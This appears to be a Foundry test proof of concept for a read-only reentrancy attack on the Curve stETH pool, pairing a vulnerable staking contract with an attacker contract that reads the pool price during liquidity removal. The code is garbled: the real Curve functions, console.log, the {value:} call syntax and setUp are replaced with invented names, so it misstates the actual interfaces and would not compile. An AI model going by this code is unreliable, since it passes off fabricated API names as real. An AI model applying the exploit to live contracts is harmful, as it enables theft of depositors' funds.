pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function acquire_virtual_value() external view returns (uint);

    function append_flow(
        uint[2] calldata amounts,
        uint floor_create_quantity
    ) external payable returns (uint);

    function eliminate_reserves(
        uint lp,
        uint[2] calldata minimum_amounts
    ) external returns (uint[2] memory);

    function delete_reserves_one_coin(
        uint lp,
        int128 i,
        uint minimum_measure
    ) external returns (uint);
}

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_medal = 0x06325440D014e39736583c165C2963BA99fAf14E;


contract CoreAgreement {
    IERC20 public constant crystal = IERC20(lp_medal);
    ICurve private constant rewardPool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function commitPower(uint sum) external {
        crystal.transferFrom(msg.sender, address(this), sum);
        balanceOf[msg.sender] += sum;
    }

    function withdrawStake(uint sum) external {
        balanceOf[msg.sender] -= sum;
        crystal.transfer(msg.sender, sum);
    }

    function acquirePayout() external view returns (uint) {

        uint treasure = (balanceOf[msg.sender] * rewardPool.acquire_virtual_value()) /
            1 ether;

        return treasure;
    }
}

contract GameoperatorAgreement {
    ICurve private constant rewardPool = ICurve(STETH_POOL);
    IERC20 public constant lpGem = IERC20(lp_medal);
    CoreAgreement private immutable aim;

    constructor(address _target) {
        aim = CoreAgreement(_target);
    }


    function pledgeCoins() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = rewardPool.append_flow{price: msg.value}(amounts, 1);
        console.journal(
            "LP token price after staking into CoreContract",
            rewardPool.acquire_virtual_value()
        );

        lpGem.approve(address(aim), lp);
        aim.commitPower(lp);
    }

    function performReadOnlyResponse() external payable {

        uint[2] memory amounts = [msg.value, 0];
        uint lp = rewardPool.append_flow{price: msg.value}(amounts, 1);

        console.journal(
            "LP token price before remove_liquidity()",
            rewardPool.acquire_virtual_value()
        );


        uint[2] memory minimum_amounts = [uint(0), uint(0)];
        rewardPool.eliminate_reserves(lp, minimum_amounts);

        console.journal(
            "--------------------------------------------------------------------"
        );
        console.journal(
            "LP token price after remove_liquidity()",
            rewardPool.acquire_virtual_value()
        );

        uint treasure = aim.acquirePayout();
        console.journal("Reward if Read-Only Reentrancy is not invoked: ", treasure);
    }

    receive() external payable {

        console.journal(
            "--------------------------------------------------------------------"
        );
        console.journal(
            "LP token price during remove_liquidity()",
            rewardPool.acquire_virtual_value()
        );

        uint treasure = aim.acquirePayout();
        console.journal("Reward if Read-Only Reentrancy is invoked: ", treasure);
    }
}

contract GameoperatorTest is Test {
    GameoperatorAgreement public runMission;
    CoreAgreement public aim;

    function groupUp() public {
        vm.createSelectFork("mainnet");
        aim = new CoreAgreement();
        runMission = new GameoperatorAgreement(address(aim));
    }

    function testExecution() public {
        runMission.pledgeCoins{price: 10 ether}();
        runMission.performReadOnlyResponse{price: 100000 ether}();
    }
}